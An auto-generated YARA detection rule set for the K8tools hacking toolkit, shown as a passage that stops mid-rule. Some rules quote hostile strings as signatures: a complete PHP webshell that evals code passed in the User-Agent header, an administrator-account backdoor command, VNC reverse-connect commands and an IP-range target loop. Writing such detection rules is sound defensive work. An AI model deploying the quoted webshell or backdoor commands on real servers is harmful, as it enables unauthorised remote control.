/*
   YARA Rule Set
   Author: yarGen Rule Generator
   Date: 2020-05-19
   Identifier: K8tools
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule ms11_046 {
   meta:
      description = "K8tools - file ms11-046.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "5e6be71e2c481b678c0352bc8963d28d70c6633fc1e8ec572f903406f4f3d2cf"
   strings:
      $s1 = "[*] Token system command" fullword ascii /* score: '26.00'*/
      $s2 = "[*] command add user k8gege k8gege" fullword ascii /* score: '23.01'*/
      $s3 = "[*] User has been successfully added" fullword ascii /* score: '15.00'*/
      $s4 = "[>] ms11-046 Exploit" fullword ascii /* score: '8.00'*/
      $s5 = "[*] Add to Administrators success" fullword ascii /* score: '8.00'*/
      $s6 = "Administrators" fullword wide /* PEStudio Blacklist: strings */ /* score: '4.88'*/ /* Goodware String - occured 119 times */
      $s7 = "127.0.0.1" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.73'*/ /* Goodware String - occured 267 times */
      $s8 = "[>] by k8gege" fullword ascii /* score: '1.00'*/
      $s9 = "D$4j`Ph" fullword ascii /* score: '1.00'*/
      $s10 = "k8gege" fullword wide /* score: '1.00'*/
      $s11 = "u`Whtp@" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      ( pe.imphash() == "f1038e72c8589e831cca550338ef31b2" or 8 of them )
}

rule CHM_______________ {
   meta:
      description = "K8tools - file CHM网马生成器.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ee973cef02c1d258eba2e892a47e91c62d54fbf3670ffc6bbea716ccc860f45d"
   strings:
      $x1 = "msvbvm60.dll" fullword ascii /* reversed goodware string 'lld.06mvbvsm' */ /* score: '33.00'*/
      $s2 = "pGet/?" fullword ascii /* score: '6.00'*/
      $s3 = "lmnopq" fullword ascii /* score: '5.00'*/
      $s4 = "soutqh" fullword ascii /* score: '5.00'*/
      $s5 = "netapi" fullword ascii /* score: '5.00'*/
      $s6 = "bcdfgh" fullword ascii /* score: '5.00'*/
      $s7 = "CYglnzG7" fullword ascii /* score: '5.00'*/
      $s8 = "BCDEFW " fullword ascii /* score: '4.42'*/
      $s9 = "-qmlyF\"" fullword ascii /* score: '4.00'*/
      $s10 = "QWRVvDs" fullword ascii /* score: '4.00'*/
      $s11 = "TModeInv" fullword ascii /* score: '4.00'*/
      $s12 = "6ZnZR!" fullword ascii /* score: '4.00'*/
      $s13 = "rBtJvRxZzb|j~r~z~" fullword ascii /* score: '4.00'*/
      $s14 = "&UHP.QPM" fullword ascii /* score: '4.00'*/
      $s15 = "nOiNT(@^" fullword ascii /* score: '4.00'*/
      $s16 = "rBtlvux" fullword ascii /* score: '4.00'*/
      $s17 = "RCPTr`/O:ep" fullword ascii /* score: '4.00'*/
      $s18 = "RjliU`%A" fullword ascii /* score: '4.00'*/
      $s19 = "Umar;J`" fullword ascii /* score: '4.00'*/
      $s20 = "FgFDQ.6j" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      ( pe.imphash() == "cc880652726afd2f3a057fff96e83c4e" or ( 1 of ($x*) or 4 of them ) )
}

rule K8tools_K8 {
   meta:
      description = "K8tools - file K8.png"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2aa864a9d5088c09883877bed442754abbdf0abd33b9f7936c9d488d0bad6b90"
   strings:
      $s1 = "'Waan>sG" fullword ascii /* score: '4.00'*/
      $s2 = "VbBCz\"%^" fullword ascii /* score: '4.00'*/
      $s3 = ",yURW#~r;" fullword ascii /* score: '4.00'*/
      $s4 = "LLxMH0" fullword ascii /* score: '2.00'*/
      $s5 = "\\.eMIv" fullword ascii /* score: '2.00'*/
      $s6 = "4kMB/ " fullword ascii /* score: '1.42'*/
      $s7 = "-V3^ I" fullword ascii /* score: '1.00'*/
      $s8 = "4IHoL1" fullword ascii /* score: '1.00'*/
      $s9 = "uW(Lg9?9" fullword ascii /* score: '1.00'*/
      $s10 = "zc`EbH0" fullword ascii /* score: '1.00'*/
      $s11 = "]i3kfSB" fullword ascii /* score: '1.00'*/
      $s12 = "6b|}BP" fullword ascii /* score: '1.00'*/
      $s13 = "E%s{C%" fullword ascii /* score: '1.00'*/
      $s14 = "wu36Y\"" fullword ascii /* score: '1.00'*/
      $s15 = "D199NT" fullword ascii /* score: '1.00'*/
      $s16 = "B`\\k`/" fullword ascii /* score: '1.00'*/
      $s17 = "{u'I-&" fullword ascii /* score: '1.00'*/
      $s18 = "GT[f`d3}" fullword ascii /* score: '1.00'*/
      $s19 = "&&!558" fullword ascii /* score: '1.00'*/
      $s20 = "YA@ Dv" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 200KB and
      8 of them
}

rule K8tools__git_hooks_update {
   meta:
      description = "K8tools - file update.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "751c037320024ec2ee2757f3ffae0b10ad2c946367684e7059d4dc97eac7e431"
   strings:
      $s1 = "# --- Command line" fullword ascii /* score: '26.00'*/
      $s2 = "# --- Config" fullword ascii /* score: '18.00'*/
      $s3 = "projectdesc=$(sed -e '1q' \"$GIT_DIR/description\")" fullword ascii /* score: '18.00'*/
      $s4 = "echo \"Don't run this script from the command line.\" >&2" fullword ascii /* score: '18.00'*/
      $s5 = "# --- Finished" fullword ascii /* score: '16.00'*/
      $s6 = "# --- Safety check" fullword ascii /* score: '16.00'*/
      $s7 = "# --- Check types" fullword ascii /* score: '16.00'*/
      $s8 = "echo \"*** Use 'git tag [ -a | -s ]' for tags you want to propagate.\" >&2" fullword ascii /* score: '16.00'*/
      $s9 = "echo \"*** Project description file hasn't been set\" >&2" fullword ascii /* score: '14.00'*/
      $s10 = "# An example hook script to block unannotated tags from entering." fullword ascii /* score: '14.00'*/
      $s11 = "# check for no description" fullword ascii /* score: '14.00'*/
      $s12 = "if [ \"$oldrev\" = \"$zero\" -a \"$denycreatebranch\" = \"true\" ]; then" fullword ascii /* score: '12.00'*/
      $s13 = "if [ -z \"$refname\" -o -z \"$oldrev\" -o -z \"$newrev\" ]; then" fullword ascii /* score: '12.00'*/
      $s14 = "refs/heads/*,commit)" fullword ascii /* score: '12.00'*/
      $s15 = "allowmodifytag=$(git config --bool hooks.allowmodifytag)" fullword ascii /* score: '11.17'*/
      $s16 = "allowdeletebranch=$(git config --bool hooks.allowdeletebranch)" fullword ascii /* score: '11.17'*/
      $s17 = "denycreatebranch=$(git config --bool hooks.denycreatebranch)" fullword ascii /* score: '11.17'*/
      $s18 = "allowunannotated=$(git config --bool hooks.allowunannotated)" fullword ascii /* score: '11.17'*/
      $s19 = "allowdeletetag=$(git config --bool hooks.allowdeletetag)" fullword ascii /* score: '11.17'*/
      $s20 = "echo \"*** Tag '$refname' already exists.\" >&2" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 10KB and
      8 of them
}

rule K8tools__git_info_exclude {
   meta:
      description = "K8tools - file exclude"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6671fe83b7a07c8932ee89164d1f2793b2318058eb8b98dc5c06ee0a5a3b0ec1"
   strings:
      $s1 = "# git ls-files --others --exclude-from=.git/info/exclude" fullword ascii /* score: '15.00'*/
      $s2 = "# Lines that start with '#' are comments." fullword ascii /* score: '11.00'*/
      $s3 = "# exclude patterns (uncomment them if you want to use them):" fullword ascii /* score: '11.00'*/
      $s4 = "# For a project mostly in C, the following would be a good set of" fullword ascii /* score: '8.00'*/
      $s5 = "# *.[oa]" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x2023 and filesize < 1KB and
      all of them
}

rule K8______PHP_______UA_______________ {
   meta:
      description = "K8tools - file K8飞刀PHP-专用UA一句话木马.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6fa288893e53f18a3cd3db466d5d63485355da2f6260924adfb8edadff33c9e6"
   strings:
      $s1 = "<? $ua=@$_SERVER[\"HTTP_USER_AGENT\"];$row=split(\"===\",$ua);echo \"->|\";if($row[0]==\"tom\")@eval($row[1]);echo \"|<-\";?>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ________Hacking_Team_Flash_0day_______Firefox_IE______________20150707_K8_ {
   meta:
      description = "K8tools - file [视频]Hacking Team Flash 0day样本(Firefox IE)完美触发_20150707[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "5bbeb70a8110c22c826c6f75fcdcc7b88ca9d5edde6113612651d2ea7cc89d1e"
   strings:
      $s1 = "]]\\7\\@B" fullword ascii /* score: '9.00'*/ /* hex encoded string '{' */
      $s2 = "mDLlfiy" fullword ascii /* score: '9.00'*/
      $s3 = "\\flash0day_20150707[K8].rar" fullword ascii /* score: '8.00'*/
      $s4 = "iRc3H`" fullword ascii /* score: '6.00'*/
      $s5 = "0DqN}k* " fullword ascii /* score: '5.42'*/
      $s6 = ".8ih9E^* " fullword ascii /* score: '5.42'*/
      $s7 = "'0t_+ " fullword ascii /* score: '5.42'*/
      $s8 = "iw\\h+ " fullword ascii /* score: '5.42'*/
      $s9 = "no -d13|V" fullword ascii /* score: '5.00'*/
      $s10 = "nJy{ -" fullword ascii /* score: '5.00'*/
      $s11 = "+ <-2^" fullword ascii /* score: '5.00'*/
      $s12 = "srTvj94" fullword ascii /* score: '5.00'*/
      $s13 = "h4+ BV" fullword ascii /* score: '5.00'*/
      $s14 = ".r0 -!" fullword ascii /* score: '5.00'*/
      $s15 = "|2* L0" fullword ascii /* score: '5.00'*/
      $s16 = "UhzZvcG9" fullword ascii /* score: '5.00'*/
      $s17 = "\\X.bfJ" fullword ascii /* score: '5.00'*/
      $s18 = "LJseis5" fullword ascii /* score: '5.00'*/
      $s19 = "FAaaoYB9" fullword ascii /* score: '5.00'*/
      $s20 = "?# -d9" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 7000KB and
      8 of them
}

rule k8uac_20181125_K8_ {
   meta:
      description = "K8tools - file k8uac_20181125[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "f112d6aafad572c11a6ec1a92109283a1a97db13a3dc5f3694fc283d08ed1336"
   strings:
      $s1 = "k8uac.exe=" fullword ascii /* score: '11.00'*/
      $s2 = "bLDj0D=" fullword ascii /* score: '4.00'*/
      $s3 = "CbKbd!G" fullword ascii /* score: '4.00'*/
      $s4 = "uMgYE9+" fullword ascii /* score: '4.00'*/
      $s5 = "mvGvfo." fullword ascii /* score: '4.00'*/
      $s6 = "`e.aWw" fullword ascii /* score: '4.00'*/
      $s7 = "gLNUIX}Y" fullword ascii /* score: '4.00'*/
      $s8 = "HbsyZ8" fullword ascii /* score: '2.00'*/
      $s9 = "'>|yb_= " fullword ascii /* score: '1.42'*/
      $s10 = "H&za0 " fullword ascii /* score: '1.42'*/
      $s11 = "^%|aC " fullword ascii /* score: '1.42'*/
      $s12 = "be GUw" fullword ascii /* score: '1.00'*/
      $s13 = "y !CYk" fullword ascii /* score: '1.00'*/
      $s14 = "z.w#yF" fullword ascii /* score: '1.00'*/
      $s15 = "@jT[:h" fullword ascii /* score: '1.00'*/
      $s16 = "`.U1lF" fullword ascii /* score: '1.00'*/
      $s17 = "|vW FY" fullword ascii /* score: '1.00'*/
      $s18 = "W&s/^,~" fullword ascii /* score: '1.00'*/
      $s19 = "f6vy*" fullword ascii /* score: '1.00'*/
      $s20 = "oH7q=s*:5" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      8 of them
}

rule k8vncpwd {
   meta:
      description = "K8tools - file k8vncpwd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a8547c4d903cf5262dfb2524824bdb0127b0977f4a1135dca2116e18de51aa1b"
   strings:
      $s1 = "vncpwd.exe" fullword wide /* score: '22.00'*/
      $s2 = "constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "vncpwd" fullword wide /* score: '5.00'*/
      $s4 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s5 = "RSDS%?t" fullword ascii /* score: '4.00'*/
      $s6 = "L$|Qh0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "LuUV<Wg" fullword ascii /* score: '4.00'*/
      $s8 = "OTun),{" fullword ascii /* score: '4.00'*/
      $s9 = "T$h9T$" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "ForceRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1167 times */
      $s11 = "NoRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1170 times */
      $s12 = "FL9~Xu" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "This indicates a bug in your application. It is most likely the result of calling an MSIL-compiled (/clr) function from a native" ascii /* score: '3.00'*/
      $s14 = "t.9Vlt)" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "\\}\\iHP" fullword ascii /* score: '2.00'*/
      $s16 = "L$4;D$Ts<)D$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "hMWSI6" fullword ascii /* score: '2.00'*/
      $s18 = "\\5CnqS<m" fullword ascii /* score: '2.00'*/
      $s19 = ";l$TsY)l$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s20 = "  2019" fullword wide /* score: '1.17'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      ( pe.imphash() == "9dd8c0ff4fc84287e5b766563240f983" or 8 of them )
}

rule K8openssl_______Bat___ {
   meta:
      description = "K8tools - file K8openssl批量 Bat版.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "9396fd22cf19c685ab50b31e3afa4cd98262955a2ca80d417d1517c682c0f72e"
   strings:
      $s1 = "for /l %%i in (1,1,255) do echo 103.21.59.%%i>>ip.txt" fullword ascii /* score: '22.00'*/
      $s2 = "\\sleep.exe" fullword ascii /* score: '16.00'*/
      $s3 = "SSL.bat" fullword ascii /* score: '15.00'*/
      $s4 = "kdel ip.txt" fullword ascii /* score: '11.00'*/
      $s5 = "\\ip.txt" fullword ascii /* score: '9.00'*/
      $s6 = "\\for100.bat" fullword ascii /* score: '9.00'*/
      $s7 = "\\heartbroken_bin.py" fullword ascii /* score: '8.00'*/
      $s8 = "\\ssltest.py" fullword ascii /* score: '5.00'*/
      $s9 = "\\ssltest-stls.py" fullword ascii /* score: '5.00'*/
      $s10 = "K8openssl" fullword ascii /* score: '4.00'*/
      $s11 = "BatHr*\\" fullword ascii /* score: '4.00'*/
      $s12 = "61.164.205.24tlt " fullword ascii /* score: '1.42'*/
      $s13 = "}[pL a" fullword ascii /* score: '1.00'*/
      $s14 = "OUI}Jp[X" fullword ascii /* score: '1.00'*/
      $s15 = "n?]c&W" fullword ascii /* score: '1.00'*/
      $s16 = "QRDzI$" fullword ascii /* score: '1.00'*/
      $s17 = "ZL)\"0`M;" fullword ascii /* score: '1.00'*/
      $s18 = "@5A%wJc" fullword ascii /* score: '1.00'*/
      $s19 = "test0-" fullword ascii /* score: '1.00'*/
      $s20 = "7?GH(67" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 20KB and
      8 of them
}

rule K8_SC_ENCODE_CobaltStrike___Metasploit_Shellcode_____________ {
   meta:
      description = "K8tools - file K8_SC_ENCODE(CobaltStrike & Metasploit Shellcode免杀工具).rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "035643e3c246c445cffbd093874f64ac874eb248b7ee3e75d28114a91e2133fb"
   strings:
      $s1 = "K8_SC_ENCODE.exeo" fullword ascii /* score: '8.00'*/
      $s2 = "eFa.hCp" fullword ascii /* score: '7.00'*/
      $s3 = "u:\\0K!" fullword ascii /* score: '7.00'*/
      $s4 = "jmtC6[YKQ#'H" fullword ascii /* score: '4.00'*/
      $s5 = "#BSQF!" fullword ascii /* score: '4.00'*/
      $s6 = "%X}1J.VZr" fullword ascii /* score: '4.00'*/
      $s7 = "qvAJf\"" fullword ascii /* score: '4.00'*/
      $s8 = "IP.nkQHbl?" fullword ascii /* score: '4.00'*/
      $s9 = "fNdrbTk" fullword ascii /* score: '4.00'*/
      $s10 = "W>2CFIs!" fullword ascii /* score: '4.00'*/
      $s11 = "AARXEE]5R" fullword ascii /* score: '4.00'*/
      $s12 = "cXFr,{7" fullword ascii /* score: '4.00'*/
      $s13 = "SUnpW0Lv" fullword ascii /* score: '4.00'*/
      $s14 = "\\\\\\\\\\\\\\_" fullword ascii /* score: '2.42'*/
      $s15 = "\\(}S#WQl" fullword ascii /* score: '2.00'*/
      $s16 = "\\ngrSrW" fullword ascii /* score: '2.00'*/
      $s17 = "\\BoX2B-F'" fullword ascii /* score: '2.00'*/
      $s18 = "\\YCjX6" fullword ascii /* score: '2.00'*/
      $s19 = "CBomp0" fullword ascii /* score: '2.00'*/
      $s20 = "]6q+z " fullword ascii /* score: '1.42'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      8 of them
}

rule Ecshop_360_______________________Flow_php________________________________K8team_ {
   meta:
      description = "K8tools - file Ecshop 360支付宝插件漏洞+ Flow.php注入漏洞 利用动画教程[K8team].7z"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "65dd4bd108d48d3e5758331bfde796b9b4c270775dadda961c0ec3f60d752a09"
   strings:
      $s1 = "&-5zlogK3j" fullword ascii /* score: '9.00'*/
      $s2 = "* =,R{" fullword ascii /* score: '9.00'*/
      $s3 = "L8uw:\"" fullword ascii /* score: '7.00'*/
      $s4 = "Mvo:\"?" fullword ascii /* score: '7.00'*/
      $s5 = "Zx2.EUj" fullword ascii /* score: '7.00'*/
      $s6 = "R:\\E~X`" fullword ascii /* score: '7.00'*/
      $s7 = "VECHSYV" fullword ascii /* score: '6.50'*/
      $s8 = "T^VH@%s;sr" fullword ascii /* score: '6.50'*/
      $s9 = "Zxlmmhs" fullword ascii /* score: '6.00'*/
      $s10 = "jpftp@" fullword ascii /* score: '6.00'*/
      $s11 = "JE@7* " fullword ascii /* score: '5.42'*/
      $s12 = "j6CrH+ " fullword ascii /* score: '5.42'*/
      $s13 = "Q=lq -" fullword ascii /* score: '5.00'*/
      $s14 = "+ '4,\\K" fullword ascii /* score: '5.00'*/
      $s15 = "7DE^* e" fullword ascii /* score: '5.00'*/
      $s16 = "? -l6f" fullword ascii /* score: '5.00'*/
      $s17 = "Y&< -I" fullword ascii /* score: '5.00'*/
      $s18 = "ThMKsSk2" fullword ascii /* score: '5.00'*/
      $s19 = "fgMdL543" fullword ascii /* score: '5.00'*/
      $s20 = "QVVOpq1" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 12000KB and
      8 of them
}

rule pre_applypatch {
   meta:
      description = "K8tools - file pre-applypatch.sample"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e15c5b469ea3e0a695bea6f2c82bcf8e62821074939ddd85b77e0007ff165475"
   strings:
      $s1 = "test -x \"$precommit\" && exec \"$precommit\" ${1+\"$@\"}" fullword ascii /* score: '26.00'*/
      $s2 = "# An example hook script to verify what is about to be committed" fullword ascii /* score: '17.00'*/
      $s3 = "precommit=\"$(git rev-parse --git-path hooks/pre-commit)\"" fullword ascii /* score: '11.00'*/
      $s4 = "# appropriate message if it wants to stop the commit." fullword ascii /* score: '11.00'*/
      $s5 = "# by applypatch from an e-mail message." fullword ascii /* score: '8.00'*/
      $s6 = "# The hook should exit with non-zero status after issuing an" fullword ascii /* score: '8.00'*/
      $s7 = "# To enable this hook, rename this file to \"pre-applypatch\"." fullword ascii /* score: '8.00'*/
      $s8 = ". git-sh-setup" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 1KB and
      all of them
}

rule ______6_0_2_614______ {
   meta:
      description = "K8tools - file 卡巴6.0.2.614提权.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "079763535b1dbde97a4366f587b2464923d8cd34796c5a8981447d852f73908d"
   strings:
      $s1 = "C:\\Users\\K8team\\Desktop\\" fullword ascii /* score: '24.00'*/
      $s2 = "e\\??\\C:\\Hello.txt" fullword wide /* score: '22.00'*/
      $s3 = "\\Debug\\3131.pdb" fullword ascii /* score: '14.00'*/
      $s4 = "Hello from ring-0! :)" fullword ascii /* score: '13.00'*/
      $s5 = "Exploited successful" fullword ascii /* score: '13.00'*/
      $s6 = "This OS version unsupported" fullword ascii /* score: '10.00'*/
      $s7 = "}!h /B" fullword ascii /* score: '5.00'*/
      $s8 = "Object dump complete." fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 14 times */
      $s9 = "Client hook allocation failure." fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 14 times */
      $s10 = "KAV6 didn't installed" fullword ascii /* score: '4.00'*/
      $s11 = "flag == 0 || flag == 1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "<0<M<z<" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "2#2Y2e2" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s14 = "8)8<8Z8" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s15 = "DAMAGE: on top of Free block at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s16 = "?5?<?@?D?H?L?P?T?X?" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "DAMAGE: after %hs block (#%d) at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "Bad memory block found at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "crt block at 0x%08X, subtype %x, %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s20 = "normal block at 0x%08X, %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      ( pe.imphash() == "097221668b48e855f16f36d80075918b" or 8 of them )
}

rule K8tools__git_refs_heads_master {
   meta:
      description = "K8tools - file master"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "28157c9a7f6474fcc5ca95fdf16e6d3bc7e874326a8cce6d3b4b9158a4cdd907"
   strings:
      $s1 = "0deaa0edd05d9c3f4c7ca738edd135efa4ebc589" ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6430 and filesize < 1KB and
      all of them
}

rule K8tools_VNCdoor {
   meta:
      description = "K8tools - file VNCdoor.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c9b90f412b6f3b4ec2a374c98d319c8f63218264b7b895796ccb542e17b5b00b"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"4.0.0.26\" processorArc" ascii /* score: '48.00'*/
      $x2 = "C:\\Users\\null\\Desktop\\K8vncdoor\\VNCdoor\\Debug\\VNCdoor.pdb" fullword ascii /* score: '37.00'*/
      $x3 = "C:\\Users\\null\\Desktop\\K8vncdoor\\VNCdoor\\Readme.cpp" fullword ascii /* score: '34.00'*/
      $x4 = "C:\\Users\\null\\Desktop\\K8vncdoor\\VNCdoor\\VNCdoor.cpp" fullword ascii /* score: '31.00'*/
      $x5 = "C:\\Users\\null\\Desktop\\K8vncdoor\\VNCdoor\\VNCdoorDlg.cpp" fullword ascii /* score: '31.00'*/
      $s6 = "\\svchost.exe vnc.dll,VNC -port " fullword ascii /* score: '29.42'*/
      $s7 = "\\svchost.exe vnc.dll,VNC -connect " fullword ascii /* score: '26.42'*/
      $s8 = "xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=" ascii /* score: '26.00'*/
      $s9 = "ependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" pro" ascii /* score: '26.00'*/
      $s10 = "VNCdoor.EXE" fullword wide /* score: '26.00'*/
      $s11 = "userinit.exe,tianya.exe" fullword ascii /* score: '25.00'*/
      $s12 = "VNCHooks.dll" fullword ascii /* score: '23.00'*/
      $s13 = "MSVCRTD.dll" fullword ascii /* score: '23.00'*/
      $s14 = "ReVserver.exe" fullword ascii /* score: '22.00'*/
      $s15 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"4.0.0.26\" processorArc" ascii /* score: '22.00'*/
      $s16 = "VNCserver.exe" fullword ascii /* score: '22.00'*/
      $s17 = "tianya.exe" fullword ascii /* score: '22.00'*/
      $s18 = "vnc.dll" fullword ascii /* score: '20.00'*/
      $s19 = "MFC42D.DLL" fullword ascii /* score: '20.00'*/
      $s20 = "lse\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo></assembly>" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "0b375fe8cb6fc16b0b56d741a6f41f20" or ( 1 of ($x*) or 4 of them ) )
}

rule K8PortScan {
   meta:
      description = "K8tools - file K8PortScan.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s7 = "bK8PortScan.exe.manifest" fullword ascii /* score: '18.00'*/
      $s8 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s9 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s10 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s11 = "opyi-windows-manifest-filename K8PortScan.exe.manifest" fullword ascii /* score: '15.00'*/
      $s12 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PyUnicode_FromFormat" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for PySys_GetObject" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for PyUnicode_FromString" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for Py_DecRef" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for Py_SetProgramName" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for PyEval_EvalCode" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule K8PortScan_Suse10_x64 {
   meta:
      description = "K8tools - file K8PortScan_Suse10_x64"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b9df9b1eafdcc6c6440d4d924ac09262e736c94d22601722c7994bf12031f4a6"
   strings:
      $s1 = "PI_GetExecPrefix" fullword ascii /* score: '21.00'*/
      $s2 = "PI_PyImport_ExecCodeModule" fullword ascii /* score: '19.00'*/
      $s3 = "Cannot dlsym for PyImport_ExecCodeModule" fullword ascii /* score: '15.00'*/
      $s4 = "lsb best-effort exec failed" fullword ascii /* score: '15.00'*/
      $s5 = "openTarget" fullword ascii /* score: '14.00'*/
      $s6 = "cmdread" fullword ascii /* score: '14.00'*/
      $s7 = "import sys;sys.frozen='dll'" fullword ascii /* score: '12.42'*/
      $s8 = "execvp@@GLIBC_2.2.5" fullword ascii /* score: '12.00'*/
      $s9 = "execv@@GLIBC_2.2.5" fullword ascii /* score: '12.00'*/
      $s10 = "getPyVersion" fullword ascii /* score: '12.00'*/
      $s11 = "/proc/self/cmdline" fullword ascii /* score: '12.00'*/
